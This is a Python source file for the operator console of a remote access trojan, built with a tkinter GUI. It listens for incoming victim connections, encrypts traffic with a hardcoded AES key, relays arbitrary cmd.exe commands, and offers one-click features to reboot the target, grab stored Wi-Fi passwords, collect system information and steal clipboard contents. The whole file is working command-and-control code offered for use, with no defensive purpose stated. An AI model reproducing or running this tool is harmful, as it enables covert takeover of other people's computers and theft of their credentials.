import tkinter
from tkinter import scrolledtext
from tkinter import messagebox
import time
import os.path
import socket
import subprocess
import threading

from Cryptodome.Cipher import AES
from Cryptodome.Util import Padding
global sock, addr, conn

# Encryption key
key = b"zj20~IlF+dhg33.+,ZHqGL)f\oH4F$b&"
IV = b"MqvxhvaY2&Hhw!H@"


# Encrypt the data
def encrypt(message):
    try:
        encryptor = AES.new(key, AES.MODE_CBC, IV)
        padded_message = Padding.pad(message, 16)
        encrypted_message = encryptor.encrypt(padded_message)
        return encrypted_message
    except Exception:
        return ""

# Decrypt data
def decrypt(cipher):
    try:
        decryptor = AES.new(key, AES.MODE_CBC, IV)
        decrypted_padded_message = decryptor.decrypt(cipher)
        decrypted_message = Padding.unpad(decrypted_padded_message, 16)
        return decrypted_message
    except Exception:
        return ""

# Connect loop
def connect(sock, myip, mylistenport):
    StatusText.config(text="[!] Started, awaiting connection...", fg="yellow")
    global conn, addr
    try:
        conn, addr = sock.accept()
        textOutput.insert(tkinter.INSERT, "\n[+] Connection established from " + str(addr) + " on port" + str(mylistenport) + "\n")
        StatusText.config(text="[+] Connection established", fg="green")
    except:
        StatusText.config(text="[-] Disconnected [ Error ]", fg="red")
    while True:
        try:
            command = decrypt(conn.recv(1024))
            command = command.decode()
        except Exception:
            time.sleep(1)
            continue


        if 'exit' in command:
            conn.send(encrypt('exit'.encode()))
            conn.close()
            StatusText.config(text="[-] Disconnected", fg="red")
            return 1
            break
        elif 'getsinfo' in command:
            while True:
                try:
                    info = conn.recv(1024)
                except:
                    print("")
                if info != "":
                    try:
                        info = decrypt(info)
                    except:
                        print("")
                    if 'finito' in info.decode():
                        break
                    textOutput.insert(tkinter.INSERT, "\nSystem info:\n" + info.decode())

        elif 'byebye' in command:
            try:
                conn.send(encrypt('exit'.encode()))
                conn.close()
                StatusText.config(text="[-] Disconnected", fg="red")
            except Exception:
                StatusText.config(text="[-] Disconnected", fg="red")
            return 0
        else:
            commandout = command + "\n--------------------------------------------\n"
            textOutput.insert(tkinter.INSERT, commandout)
            continue


# Start Button
def startbuttongo():
    STATUS = "listen"
    newthread = WaitConThread()
    newthread.start()


# Stop button
def stopbutton():
    STATUS = "stop"
    try:
        conn.send(encrypt("byebye".encode()))
        conn.close()
        StatusText.config(text="[-] Disconnected", fg="red")
    except:
        StatusText.config(text="[-] Disconnected", fg="red")


# Thread Class for socket interactions
class WaitConThread(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)

    def run(self):
        sock = socket.socket()
        # ip to listen on
        myip = IPTxt.get()
        # port to listen - default 8080
        mylistenport = 8080
        try:
            sock.bind((myip, mylistenport))
            sock.listen(1)
        except Exception:
            STATUS = "stop"
            StatusText.config(text="[!] Connection error. Restarting")

        STATUS = "listen"
        while True:

            result = connect(sock, myip, mylistenport)

            if result == 1:
                textOutput.insert(tkinter.INSERT, "\n[+] Dropped connection. Awaiting a new connection...\n[+] Tip: use byebye to exit program\n")
                continue
            elif result == 0:
                textOutput.insert(tkinter.INSERT, "\n[+] bye-bye\n")
                break


# Run a Feature Button
def FeatureRun():
    if radoption.get() == 1:
        textOutput.insert(tkinter.INSERT, "Restarting the computer...\n")
        try:
            conn.send(encrypt("shutdown -r".encode()))
        except:
            textOutput.insert(tkinter.INSERT, "error sending\n")
        stopbutton()
    elif radoption.get() == 2:
        textOutput.insert(tkinter.INSERT, "Grabbing wifi passwords:\n")
        try:
            conn.send(encrypt("gwifi".encode()))
        except:
            textOutput.insert(tkinter.INSERT, "error sending\n")
    elif radoption.get() == 3:
        textOutput.insert(tkinter.INSERT, "Getting System info: \n")
        try:
            conn.send(encrypt("getsinfo".encode()))
        except:
            textOutput.insert(tkinter.INSERT, "error sending\n")

# Send button
def DoSend():
    try:
        conn.send(encrypt(CommandEntry.get().encode()))
        return 0
    except:
        return 0


# Clear output screen
def clearscreen():
    textOutput.delete('1.0', tkinter.END)
    return 0


# Main
if __name__ == '__main__':
    STATUS = "stop"
    form = tkinter.Tk()
    getFld = tkinter.IntVar()

    # variables
    radoption = tkinter.IntVar()
    MYIP = tkinter.StringVar()
    MYPORT = tkinter.IntVar()
    form.wm_title('Python Project')
    form.geometry("1300x600")
    stepOne = tkinter.LabelFrame(form, text=" 1. My details: ")
    stepOne.grid(row=0, columnspan=7, sticky='W',
                 padx=5, pady=5, ipadx=5, ipady=5)

    helpLf = tkinter.LabelFrame(form, text=" Output: ")
    helpLf.grid(row=0, column=9, columnspan=2, rowspan=8,
                sticky='NS', padx=6, pady=6, ipadx=220, ipady=220)

    textContainer = tkinter.Frame(helpLf, borderwidth=1, relief="sunken")
    textOutput = tkinter.Text(textContainer, width=2, height=4, wrap="none", borderwidth=0)
    textVsb = tkinter.Scrollbar(textContainer, orient="vertical", command=textOutput.yview)
    textHsb = tkinter.Scrollbar(textContainer, orient="horizontal", command=textOutput.xview)
    textOutput.configure(yscrollcommand=textVsb.set, xscrollcommand=textHsb.set)

    textOutput.grid(row=0, column=0, sticky="nsew")
    textVsb.grid(row=0, column=1, sticky="ns")
    textHsb.grid(row=1, column=0, sticky="ew")

    textContainer.grid_rowconfigure(0, weight=1)
    textContainer.grid_columnconfigure(0, weight=1)

    textContainer.pack(side="top", fill="both", expand=True)

    clearButton = tkinter.Button(helpLf, text="Clear", command=clearscreen)
    clearButton.pack(side="bottom", fill="both", expand=False)

    stepTwo = tkinter.LabelFrame(form, text=" 2. Features: ")
    stepTwo.grid(row=1, columnspan=7, sticky='W',
                 padx=5, pady=5, ipadx=5, ipady=5)

    stepThree = tkinter.LabelFrame(form, text=" 3. Send a command: ")
    stepThree.grid(row=2, columnspan=7, sticky='W',
                   padx=5, pady=5, ipadx=5, ipady=5)

    stepFour = tkinter.LabelFrame(form, text="4. Status: ")
    stepFour.grid(row=3, columnspan=7, sticky='W',
                  padx=5, pady=5, ipadx=5, ipady=5)

    IpLabel = tkinter.Label(stepOne, text="My IP:", )
    IpLabel.grid(row=0, column=0, sticky='E', padx=4, pady=2)

    IPTxt = tkinter.Entry(stepOne, textvariable=MYIP)
    IPTxt.grid(row=0, column=1, columnspan=7, sticky="WE", pady=3)
    IPTxt.insert(0, "192.168.1.21")

    StartBtn = tkinter.Button(stepOne, text="Start", command=startbuttongo)
    StartBtn.grid(row=3, column=2, sticky='W', padx=3, pady=2)

    StopBtn = tkinter.Button(stepOne, text="Stop", command=stopbutton)
    StopBtn.grid(row=3, column=3, sticky='W', padx=5, pady=2)


    outTblLbl = tkinter.Label(stepTwo,
                              text="Choose a feature and press run")
    outTblLbl.grid(row=3, column=0, sticky='W', padx=5, pady=2)

    ScreencapBox = tkinter.Radiobutton(stepTwo, text="Restart computer", variable=radoption, value=1)
    ScreencapBox.grid(row=4, column=0, sticky='WE')
    ScreencapBox.select()

    GrabwifiBox = tkinter.Radiobutton(stepTwo, text="Grab Wifi Passwords", variable=radoption, value=2)
    GrabwifiBox.grid(row=4, column=1, sticky='WE')
    GrabwifiBox.deselect()

    PortscanBox = tkinter.Radiobutton(stepTwo, text="Get System information", variable=radoption, value=3)
    PortscanBox.grid(row=4, column=2, sticky='WE')
    PortscanBox.deselect()

    RunfBtn = tkinter.Button(stepTwo, text="Run", command=FeatureRun)
    RunfBtn.grid(row=5, column=1, sticky='W', padx=3, pady=2)

    SCapBtn = tkinter.Button(stepThree, text="SEND")
    SCapBtn.grid(row=0, column=3, sticky='W', padx=5, pady=2)

    transRwLbl = tkinter.Label(stepThree,
                               text="Command ->")
    transRwLbl.grid(row=0, column=0, columnspan=1,
                    sticky='W', padx=5, pady=2)
    CommBtn = tkinter.Button(stepThree, text="SEND", command=DoSend)
    CommBtn.grid(row=0, column=3, sticky='W', padx=5, pady=2)

    CommandEntry = tkinter.Entry(stepThree, justify="left")
    CommandEntry.grid(row=0, column=1, sticky='W', ipadx=150)

    infotext = tkinter.Label(stepThree, text="Commands:\n1. Can use cmd.exe commands\n2. Navigate: use cd*[path]\n3. Grab the clipboard: getclip", justify="left")
    infotext.grid(row=1, column=0, sticky="N")
    StatusText = tkinter.Label(stepFour, text="[-] Disconnected", fg="red")
    StatusText.grid(row=0, column=0, columnspan=2,
                    sticky='W', padx=5, pady=2)

    form.mainloop()
